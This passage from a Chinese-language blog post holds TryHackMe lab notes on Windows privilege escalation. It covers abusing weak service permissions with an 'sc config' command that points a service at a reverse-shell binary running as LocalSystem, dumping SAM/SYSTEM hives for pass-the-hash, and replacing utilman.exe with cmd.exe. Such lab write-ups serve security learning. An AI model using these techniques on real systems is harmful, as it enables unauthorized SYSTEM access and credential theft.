+<p>该<code>BUILTIN\\Users</code>组具有<strong>AD</strong>和<strong>WD</strong>权限，分别允许用户创建子目录和文件。</p>
+<p>首先我们利用linux生成一个反弹shell的exe文件，上传进去，然后将这个exe文件移动到C:\MyPrograms\Disk.exe中，对这个可执行文件赋予全部权限，最后重启这个服务即可。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012119276.png" srcset="/img/loading.gif" lazyload alt="image-20240901211917190"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012122578.png" srcset="/img/loading.gif" lazyload alt="image-20240901212210441"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012127201.png" srcset="/img/loading.gif" lazyload alt="image-20240901212754030"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012128551.png" srcset="/img/loading.gif" lazyload alt="image-20240901212805459"></p>
+<h3 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h3><p>如果服务的可执行 DACL 配置(服务可执行文件的权限)正确，并且服务的二进制路径引用正确，您仍有一线机会利用该服务。如果服务 DACL（不是服务的可执行DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向您需要的任何可执行文件，并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p>
+<p><strong>服务DACL是对服务本身的控制</strong></p>
+<p>要从命令行检查服务 DACL，可以使用Sysinternals 套件中的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a>。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012229436.png" srcset="/img/loading.gif" lazyload alt="image-20240901222954169"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012229891.png" srcset="/img/loading.gif" lazyload alt="image-20240901222938643"></p>
+<p>我们可以看到该<code>BUILTIN\\Users</code>组具有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置该服务。</p>
+<p>然后我们生成一个反弹shell的exe文件，上传上去，修改其权限，然后更改服务关联的可执行文件和帐户，最后重启服务，等待反弹shell。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012235967.png" srcset="/img/loading.gif" lazyload alt="image-20240901223501856"></p>
+<p><code>sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</code></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012236789.png" srcset="/img/loading.gif" lazyload alt="image-20240901223633706"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012244754.png" srcset="/img/loading.gif" lazyload alt="image-20240901224455692"></p>
+<h2 id="滥用危险特权"><a href="#滥用危险特权" class="headerlink" title="滥用危险特权"></a>滥用危险特权</h2><h3 id="Windows-权限"><a href="#Windows-权限" class="headerlink" title="Windows 权限"></a>Windows 权限</h3><p>特权是帐户执行特定系统相关任务的权利。这些任务可以简单到关闭机器的特权，也可以是绕过某些基于DACL的访问控制的特权。</p>
+<p>每个用户都有一组分配的权限，可以使用以下命令进行检查：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">whoami /priv<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants</a> 提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才是值得关注的。</p>
+<p>我们可以在 <a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin/blob/master/README.md">https://github.com/gtworek/Priv2Admin/blob/master/README.md</a>  上找到可利用权限的完整列表。</p>
+<h3 id="SeBackup-SeRestore"><a href="#SeBackup-SeRestore" class="headerlink" title="SeBackup/SeRestore"></a>SeBackup/SeRestore</h3><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p>
+<p>有了这种能力，攻击者就可以使用多种技术轻松提升系统权限。我们将要研究的技术包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希。</p>
+<p>我们以管理员身份打开powshell才能使用上面的权限，以管理员身份打开后需要再次输入此账户的密码。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031546279.png" srcset="/img/loading.gif" lazyload alt="image-20240903154626152"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031547977.png" srcset="/img/loading.gif" lazyload alt="image-20240903154758909"></p>
+<p>整体的攻击思路:</p>
+<p>首先我们先备份sam和system的哈希，然后我们可以使用SMB服务或者其他的，将这两个备份的hash文件传递到攻击机上面，然后检索用户的哈希值，我们可以得到administrator的哈希值</p>
+<p>最终可以使用管理员的哈希执行传递哈希攻击，并以 SYSTEM 权限访问目标机器.</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031611062.png" srcset="/img/loading.gif" lazyload alt="image-20240903161147004"></p>
+<p>此时已经备份成功。</p>
+<p>然后启动smb服务，在本地创建一个share目录作为共享的public目录。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031620802.png" srcset="/img/loading.gif" lazyload alt="image-20240903162004730"></p>
+<p>将两个备份文件传递到public目录上去。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031628623.png" srcset="/img/loading.gif" lazyload alt="image-20240903162833498"></p>
+<p>然后检索hash.</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031632347.png" srcset="/img/loading.gif" lazyload alt="image-20240903163251253"></p>
+<p>可以看到能够得到administrator的hash.</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031635718.png" srcset="/img/loading.gif" lazyload alt="image-20240903163517545"></p>
+<p>最后也是成功的得到了administrator权限。</p>
+<h3 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h3><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了许多可能性，例如，我们可以搜索以 SYSTEM 身份运行的服务并获取该服务可执行文件的所有权。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031654370.png" srcset="/img/loading.gif" lazyload alt="image-20240903165417290"></p>
+<p>这次我们将利用<code>utilman.exe</code>来提升权限。Utilman 是一款内置 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031707081.png" srcset="/img/loading.gif" lazyload alt="image-20240903170729988"></p>
+<p>由于 Utilman 以 SYSTEM 权限运行，因此如果我们将原始二进制文件替换为我们喜欢的任何有效载荷，我们将有效地获得 SYSTEM 权限。由于我们可以获得任何文件的所有权，因此替换它很简单。</p>
+<p>下面是整体攻击思路：</p>
+<p>首先我们获取utilman.exe的所有权，然后我们对当前所在用户赋予对utilman.exe的完全控制的权限，接着用 cmd.exe 的副本替换 utilman.exe，最后再触发utilman.exe即可。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031718432.png" srcset="/img/loading.gif" lazyload alt="image-20240903171856361"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031719957.png" srcset="/img/loading.gif" lazyload alt="image-20240903171924694"></p>
+<h3 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate/SeAssignPrimaryToken"></a>SeImpersonate/SeAssignPrimaryToken</h3><p>这些权限允许进程模拟其他用户并代表他们行事。模拟通常包括能够在另一个用户的安全上下文中生成进程或线程。</p>
+<p>没看懂什么意思…</p>
+<h2 id="滥用易受攻击的软件"><a href="#滥用易受攻击的软件" class="headerlink" title="滥用易受攻击的软件"></a>滥用易受攻击的软件</h2><h3 id="未打补丁的软件"><a href="#未打补丁的软件" class="headerlink" title="未打补丁的软件"></a>未打补丁的软件</h3><p>目标系统上安装的软件可以提供各种特权提升机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用该 <code>wmic</code> 工具列出目标系统上安装的软件及其版本。以下命令将转储它可以收集的有关已安装软件的信息.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">wmic product get name,version,vendor<br></code></pre></td></tr></table></figure>
+
+<p>有的时候，这并不能给出所有的信息，我们还需要注意桌面快捷方式，可用服务或通常任何表明可能存在其他易受攻击的软件的痕迹。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031839409.png" srcset="/img/loading.gif" lazyload alt="image-20240903183956263"></p>
+<p>下面是一些工具：</p>
+<p>WinPEAS <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031849604.png" srcset="/img/loading.gif" lazyload alt="image-20240903184931481"></p>
+<p>PrivescCheck <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">https://github.com/itm4n/PrivescCheck</a></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031850008.png" srcset="/img/loading.gif" lazyload alt="image-20240903185011924"></p>
+<p>WES-NG <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031850965.png" srcset="/img/loading.gif" lazyload alt="image-20240903185038892"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Jr-Penetration-Tester/" class="category-chain-item">Jr Penetration Tester</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/tryhackme/" class="print-no-link">#tryhackme</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>初识windows提权</div>
+      <div>http://example.com/2024/08/05/windows提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>FSRM</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2024年9月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/30/linux%E6%8F%90%E6%9D%83/" title="初识linux提权">
+                        <span class="hidden-mobile">初识linux提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"uIHnq7AMZzxGr67001Hi4rIt-gzGzoHsz","appKey":"dXTOT6Pscxry6haYWYds2nMd","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
